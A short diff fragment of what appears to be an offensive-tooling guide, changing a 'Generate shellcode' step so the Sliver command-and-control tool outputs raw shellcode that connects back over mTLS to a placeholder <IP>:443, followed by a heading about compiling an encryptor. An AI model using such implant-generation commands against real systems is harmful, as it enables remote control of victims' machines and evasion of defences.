@@ -11,7 +11,7 @@
 
 **1. Generate shellcode:**
 ```bash
-sliver > generate --mtls <IP>:443 --format csharp --save /tmp/sc.cs
+sliver > generate --mtls <IP>:443 --format shellcode --save /tmp/sc.bin
 ```
 
 **2. Compile the encryptor:**
